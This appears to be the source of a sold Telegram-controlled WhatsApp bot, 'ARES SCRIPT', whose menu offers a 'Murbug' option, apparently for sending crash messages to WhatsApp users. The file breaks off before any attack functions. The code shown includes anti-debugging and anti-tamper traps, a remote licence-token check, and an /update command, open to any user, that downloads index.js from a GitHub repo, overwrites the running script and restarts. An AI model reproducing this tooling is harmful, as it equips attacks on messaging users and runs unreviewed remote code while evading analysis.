const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
} = require('xatabail');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/yannxbrut-a1/database/refs/heads/main/tokens.json';
const thumbnailUrl = "https://files.catbox.moe/z4aop7.png";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}
function activateSecureMode() {
  secureMode = true;
}

(() => {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }
  setInterval(() => {
    const t1 = process.hrtime.bigint();
    debugger;
    const t2 = process.hrtime.bigint();
    if (Number(t2 - t1) / 1e6 > 80) {
      throw new Error(randErr());
    }
  }, 800);
  setInterval(() => {
    if (process.execArgv.join(" ").includes("--inspect") ||
        process.execArgv.join(" ").includes("--debug")) {
      throw new Error(randErr());
    }
  }, 1500);

  const code = "Xatanical";
  if (code.length !== 9) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
System Information
────────────────────
Developer : @yannxbrutt
Version : 2.0
Status : Database Connected Successfully
  `))
  }
  const hash1 = Buffer.from(secure.toString()).toString("base64");
  const hash2 = crypto.createHash("sha256").update(hash1).digest("hex");
  const hash3 = crypto.createHash("md5").update(hash2).digest("hex");

  setInterval(() => {
    const current = Buffer.from(secure.toString()).toString("base64");
    const c2 = crypto.createHash("sha256").update(current).digest("hex");
    const c3 = crypto.createHash("md5").update(c2).digest("hex");

    if (current !== hash1 || c2 !== hash2 || c3 !== hash3) {
      throw new Error(randErr());
    }
  }, 2000);
  Object.freeze(secure);
  Object.defineProperty(global, "secure", {
    value: undefined,
    writable: false,
    configurable: false
  });

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });
  Object.freeze(process.exit);
  Object.freeze(process.kill);
  Object.freeze(Function.prototype);
  Object.freeze(Object.prototype);
  Object.freeze(Array.prototype);

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {

        console.log(chalk.bold.red(`
System Information
────────────────────
Developer : @yannxbrutt
Version : 2.0
Alert : Token Not Validate Bypass
  `))

        activateSecureMode();
        hardExit(1);
      }
      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {

          console.log(chalk.bold.yellow(`
System Information
────────────────────
Developer : @yannxbrutt
Version : 1.0
Alert : Script Di Bypass Alert
  `))

          activateSecureMode();
          hardExit(1);
        }
      }
      if (eval.toString().length !== 33 ||
          Function.toString().length !== 37) {
        activateSecureMode();
        hardExit(1);
      }

    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 1500);

  global.validateToken = async (databaseUrl, tokenBot) => {
    try {
      const hashed = crypto.createHash("sha256").update(tokenBot).digest("hex");

      const rawData = await new Promise((resolve, reject) => {
        https
          .get(databaseUrl, { timeout: 5000 }, (res) => {
            let data = "";
            res.on("data", (chunk) => (data += chunk));
            res.on("end", () => resolve(data));
          })
          .on("error", reject)
          .on("timeout", () => reject(new Error("timeout")));
      });

      let tokens = [];
      try {
        const parsed = JSON.parse(rawData);
        tokens = parsed.tokens || [];
      } catch {
        console.log(chalk.bold.yellow(`
Database Error: JSON invalid / rusak.
        `));
        activateSecureMode();
        process.exit(1);
      }

      const layer1 = tokens.includes(tokenBot);

      const layer2 = tokens
        .map((t) => crypto.createHash("sha256").update(t).digest("hex"))
        .includes(hashed);

      const xor = (str) =>
        Buffer.from(str)
          .map((n) => n ^ 0x6f)
          .toString("hex");

      const layer3 = tokens.map((t) => xor(t)).includes(xor(tokenBot));
      const entropyCheck =
        typeof tokenBot === "string" &&
        tokenBot.length > 20 &&
        /[A-Z]/.test(tokenBot) &&
        /[0-9]/.test(tokenBot);

      if (!(layer1 && layer2 && layer3 && entropyCheck)) {
        console.log(chalk.bold.yellow(`
 System Information
────────────────────
Developer : @yannxbrutt
Version : 2.0
Status : Connected Successfully
        `));
        activateSecureMode();
        process.exit(1);
      }

    } catch (err) {
      console.log(chalk.bold.yellow(`
Database Error: Tidak dapat mengakses server token.
      `));
      activateSecureMode();
      process.exit(1);
    }
  };
  setInterval(() => {
    if (typeof activateSecureMode !== "function") {
      hardExit(1);
    }
  }, 2500);

})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const groupFile = path.join(__dirname, "allowedGroups.json");

function loadAllowedGroups() {
    try {
        if (!fs.existsSync(groupFile)) {
            fs.writeFileSync(groupFile, JSON.stringify({}, null, 2));
            return {};
        }

        const data = JSON.parse(fs.readFileSync(groupFile, "utf8"));
        return typeof data === "object" && !Array.isArray(data) ? data : {};
    } catch {
        return {};
    }
}

function saveAllowedGroups(data) {
    fs.writeFileSync(groupFile, JSON.stringify(data, null, 2));
}

function addPremiumGroup(groupId, duration, addedBy) {
    const groups = loadAllowedGroups();

    const expiryDate = moment()
        .add(duration, 'days')
        .tz('Asia/Jakarta')
        .format('DD-MM-YYYY');

    groups[groupId] = {
        expired: expiryDate,
        addedBy: addedBy
    };

    saveAllowedGroups(groups);
    return expiryDate;
}

function isPremiumGroup(groupId) {
    const groups = loadAllowedGroups();

    if (groups[groupId]) {
        const expiryDate = moment(groups[groupId].expired, 'DD-MM-YYYY');

        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            delete groups[groupId];
            saveAllowedGroups(groups);
            return false;
        }
    }

    return false;
}

function removePremiumGroup(groupId) {
    const groups = loadAllowedGroups();
    delete groups[groupId];
    saveAllowedGroups(groups);
}

async function validatePremiumGroup(ctx) {
    const chatId = String(ctx.chat.id);
    
    // Cek apakah di group
    if (ctx.chat.type === "private") {
        await ctx.reply("❌ Command ini hanya bisa digunakan di group premium.");
        return false;
    }
    
    // Cek premium group
    if (!isPremiumGroup(chatId)) {
        await ctx.reply("❌ Group ini tidak memiliki akses premium atau sudah expired.\n\nGunakan /addgroup untuk mengaktifkan premium.");
        return false;
    }
    
    return true;
}

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.blue(`
System Information
────────────────────
Developer : @yannxbrutt
Version : 2.0
Status :  Connected Successfull

  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Xata',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>
⬡═―—⊱ ⎧ 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.blue(`
System Information
────────────────────
Developer : @@yannxbrutt
Version : 2.0
Status : Connect Successfull

  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("connect", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 Format: /connect 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "12345678");  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><pre>
⬡═―—⊱ ⎧ 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><pre>
⬡═―—⊱ ⎧ 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetbot", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

const fsp = fs.promises;
// ================== LOAD CONFIG FROM update.js (NO CACHE) ==================
function loadUpdateConfig() {
  try {
    // pastikan ambil dari root project (process.cwd()), bukan lokasi file lain
    const cfgPath = path.join(process.cwd(), "update.js");

    // hapus cache require biar selalu baca update.js terbaru setelah restart/update
    try {
      delete require.cache[require.resolve(cfgPath)];
    } catch (_) {}

    const cfg = require(cfgPath);
    return (cfg && typeof cfg === "object") ? cfg : {};
  } catch (e) {
    return {};
  }
}

const UPD = loadUpdateConfig();

// ====== CONFIG ======
const GITHUB_OWNER = UPD.github_owner || "Ared-glitch";
const DEFAULT_REPO = UPD.github_repo_default || "Aress";
const GITHUB_BRANCH = UPD.github_branch || "main";
const UPDATE_FILE_IN_REPO = UPD.update_file_in_repo || "index.js";

// token untuk WRITE (add/del)
const GITHUB_TOKEN_WRITE = UPD.github_token_write || "";

// target lokal yang bakal diganti oleh /update
const LOCAL_TARGET_FILE = path.join(process.cwd(), "index.js");

// ================== FETCH HELPER ==================
const fetchFn = global.fetch || ((...args) => import("node-fetch").then(({ default: f }) => f(...args)));

// ================== FILE WRITE ATOMIC ==================
async function atomicWriteFile(targetPath, content) {
  const dir = path.dirname(targetPath);
  const tmp = path.join(dir, `.update_tmp_${Date.now()}_${path.basename(targetPath)}`);
  await fsp.writeFile(tmp, content, { encoding: "utf8" });
  await fsp.rename(tmp, targetPath);
}

// ================== READ (PUBLIC): DOWNLOAD RAW ==================
async function ghDownloadRawPublic(repo, filePath) {
  const rawUrl =
    `https://raw.githubusercontent.com/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/${encodeURIComponent(GITHUB_BRANCH)}/${filePath}`;

  const res = await fetchFn(rawUrl, { headers: { "User-Agent": "telegraf-update-bot" } });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`Gagal download ${filePath} (${res.status}): ${txt || res.statusText}`);
  }
  return await res.text();
}

// ================== WRITE (BUTUH TOKEN): GITHUB API ==================
function mustWriteToken() {
  if (!GITHUB_TOKEN_WRITE) {
    throw new Error("Token WRITE kosong. Isi github_token_write di update.js (Contents: Read and write).");
  }
}

function ghWriteHeaders() {
  mustWriteToken();
  return {
    Authorization: `Bearer ${GITHUB_TOKEN_WRITE}`,
    Accept: "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "telegraf-gh-writer",
  };
}

async function ghGetContentWrite(repo, filePath) {
  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}?ref=${encodeURIComponent(GITHUB_BRANCH)}`;

  const res = await fetchFn(url, { headers: ghWriteHeaders() });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub GET ${res.status}: ${txt || res.statusText}`);
  }
  return res.json();
}

async function ghPutFileWrite(repo, filePath, contentText, commitMsg) {
  let sha;
  try {
    const existing = await ghGetContentWrite(repo, filePath);
    sha = existing?.sha;
  } catch (e) {
    if (!String(e.message).includes(" 404")) throw e; // 404 => create baru
  }

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = {
    message: commitMsg,
    content: Buffer.from(contentText, "utf8").toString("base64"),
    branch: GITHUB_BRANCH,
    ...(sha ? { sha } : {}),
  };

  const res = await fetchFn(url, {
    method: "PUT",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub PUT ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

async function ghDeleteFileWrite(repo, filePath, commitMsg) {
  const info = await ghGetContentWrite(repo, filePath);
  const sha = info?.sha;
  if (!sha) throw new Error("SHA tidak ketemu. Pastikan itu file (bukan folder).");

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = { message: commitMsg, sha, branch: GITHUB_BRANCH };

  const res = await fetchFn(url, {
    method: "DELETE",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub DELETE ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

// ================== COMMANDS ==================

// /update [repoOptional]
// download update_index.js -> replace local index.js -> restart
const updateWait = new Map();

// /update -> kirim foto + tombol
bot.command("update", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    const userId = ctx.from?.id;
    if (!userId) return;

    updateWait.set(userId, { repo, at: Date.now() });

    const photoUrl = "https://files.catbox.moe/gbla0x.jpg";

    const caption =
      "<b> 📦 Sistem Auto Update On Gxion Telah ke datangan Fitur Baru Dengan Ini User tidak Perlu Lagi menjalankan Script Dengan Susah Payah Cukup Ketik Saja Terimakasih Telah Menggunakan Script Gxion Iam Lixx Owner Gxion </b>";

    await ctx.replyWithPhoto(photoUrl, {
      caption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⚔️ Jalankan Update", callback_data: "RUN_UPDATE" }]
        ]
      }
    });

  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});


// tombol ditekan -> jalankan update
bot.action("RUN_UPDATE", async (ctx) => {
  try {
    await ctx.answerCbQuery("⚙️ Memulai update...");

    const userId = ctx.from?.id;
    if (!userId) return;

    const data = updateWait.get(userId);
    const repo = data?.repo || DEFAULT_REPO;

    await ctx.reply("🔄 Update sedang berjalan...\nTunggu sebentar...");

    const newCode = await ghDownloadRawPublic(repo, UPDATE_FILE_IN_REPO);

    if (!newCode || newCode.trim().length < 50) {
      throw new Error("File update kosong / tidak valid.");
    }

    try {
      const backup = path.join(process.cwd(), "index.backup.js");
      await fsp.copyFile(LOCAL_TARGET_FILE, backup);
    } catch (_) {}

    await atomicWriteFile(LOCAL_TARGET_FILE, newCode);

    updateWait.delete(userId);

    await ctx.reply("✅ Update berhasil.\n♻️ Bot akan restart...");

    setTimeout(() => process.exit(0), 3000);

  } catch (err) {
    await ctx.reply(`❌ Update gagal: ${err.message || String(err)}`);
  }
});

// /addfiles <repo> (reply file .js)
bot.command("addfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    const replied = ctx.message.reply_to_message;
    const doc = replied?.document;

    if (!doc) {
      return ctx.reply("❌ Reply file .js dulu, lalu ketik:\n/addfiles <namerepo>\nContoh: /addfiles Pullupdate");
    }

    const fileName = doc.file_name || "file.js";
    if (!fileName.endsWith(".js")) return ctx.reply("❌ File harus .js");

    await ctx.reply(`⬆️ Uploading *${fileName}* ke repo *${repo}*...`, { parse_mode: "Markdown" });

    const link = await ctx.telegram.getFileLink(doc.file_id);
    const res = await fetchFn(link.href);
    if (!res.ok) throw new Error(`Gagal download file telegram: ${res.status}`);

    const contentText = await res.text();

    await ghPutFileWrite(repo, fileName, contentText, `Add/Update ${fileName} via bot`);

    await ctx.reply(`✅ Berhasil upload *${fileName}* ke repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});

// /delfiles <repo> <path/file.js>
bot.command("dellfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;
    const file = parts[2];

    if (!file) {
      return ctx.reply("Format:\n/delfiles <namerepo> <namefiles>\nContoh: /delfiles Pullupdate index.js");
    }

    await ctx.reply(`🗑️ Menghapus *${file}* di repo *${repo}*...`, { parse_mode: "Markdown" });

    await ghDeleteFileWrite(repo, file, `Delete ${file} via bot`);

    await ctx.reply(`✅ Berhasil hapus *${file}* di repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});
  
// ====== /restart ======
bot.command("restart", async (ctx) => {
  await ctx.reply("♻️ Panel akan *restart manual* untuk menjaga kestabilan...");

  // kirim status ke grup utama kalau ada
  try {
    if (typeof sendToGroupsUtama === "function") {
      sendToGroupsUtama(
        "🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...",
        { parse_mode: "Markdown" }
      );
    }
  } catch (e) {}

  setTimeout(() => {
    try {
      if (typeof sendToGroupsUtama === "function") {
        sendToGroupsUtama(
          "🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!",
          { parse_mode: "Markdown" }
        );
      }
    } catch (e) {}
  }, 8000);

  setTimeout(() => process.exit(0), 5000);
});

bot.command("addgroup", async (ctx) => {

    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }

    if (ctx.chat.type === "private") {
        return ctx.reply("❌ Gunakan command ini di dalam group.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /addgroup 30");
    }

    const duration = parseInt(args[1]);
    if (isNaN(duration)) {
        return ctx.reply("❌ Durasi harus angka (hari)");
    }

    const groupId = String(ctx.chat.id);
    const addedBy = String(ctx.from.id);

    const expiryDate = addPremiumGroup(groupId, duration, addedBy);

    ctx.reply(
`✅ Group Premium Aktif

🆔 Group  : ${groupId}
⏳ Durasi : ${duration} hari
📅 Expired: ${expiryDate}
👤 Added By: ${addedBy}`
    );
});

bot.command("listgroup", async (ctx) => {

    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
        return ctx.reply("❌ Akses hanya untuk owner/admin.");
    }

    const groups = loadAllowedGroups();
    const keys = Object.keys(groups);

    if (keys.length === 0) {
        return ctx.reply("📭 Tidak ada group premium.");
    }

    let text = "📜 LIST GROUP PREMIUM\n\n";

    keys.forEach((id, index) => {
        text += `${index + 1}. ${id}\n`;
        text += `   📅 Expired : ${groups[id].expired}\n`;
        text += `   👤 Added By: ${groups[id].addedBy}\n\n`;
    });

    ctx.reply(text);
});

bot.command("delgroup", async (ctx) => {

    if (ctx.from.id != ownerID && !isAdmin(ctx.from.id.toString())) {
        return ctx.reply("❌ Akses hanya untuk owner/admin.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgroup -100xxxxxxxxxx");
    }

    const groupId = args[1];
    const groups = loadAllowedGroups();

    if (!groups[groupId]) {
        return ctx.reply("❌ Group tidak ditemukan.");
    }

    delete groups[groupId];
    saveAllowedGroups(groups);

    ctx.reply(`🗑 Group ${groupId} berhasil dihapus.`);
});

bot.use((ctx, next) => {
  if (secureMode) {
    return;
  }
  return next();
});

bot.start(async (ctx) => {
    return sendMainMenu(ctx);
    if (!await validatePremiumGroup(ctx)) return;
});

async function sendMainMenu(ctx) {

    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const displayName =
        ctx.from.first_name ||
        ctx.from.username ||
        "User";

    const menuMessage = `
\`\`\`js
╭━━〔 𝔸ℝ𝔼𝕊 𝕊ℂℝ𝕀ℙ𝕋 〕━━━⬣
│✦ Developer : @yannxbrutt
│✦ Version : 2.0 Stable
│✦ Status : Premium Access
╰━━━━━━━━━━━━━━━━━━⬣
╭━〔 PRICE INFORMATION 〕━⬣
│✦ Official Price : Rp 30.000
│✦ Reseller Price : Rp 60.000
│✦ Type : / Slash
╰━━━━━━━━━━━━━━━━━━━⬣

╭━━━〔 BOT STATUS 〕━━━⬣
│✦ Sender : ${senderStatus}
│✦ Runtime : ${runtimeStatus}
│✦ Memory : ${memoryStatus}
│✦ Cooldown : ${cooldownStatus}
│✦ Username : ${displayName}
╰━━━━━━━━━━━━━━━━━━━━⬣
\`\`\``;

    const keyboard = [
        [
            { text: "Settings", callback_data: "/controls", style: "primary" },
            { text: "Murbug", callback_data: "/bug", style: "danger" }
        ],
        [
            { text: "Support", callback_data: "/tqto", style: "success" }
        ],
        [
            { text: "Owners", url: "https://t.me/yannxbrutt", style: "primary" }
        ]
    ];

    await ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: keyboard }
    });
}

// ================== MAIN MENU (/start) ==================
bot.action('/start', async (ctx) => {
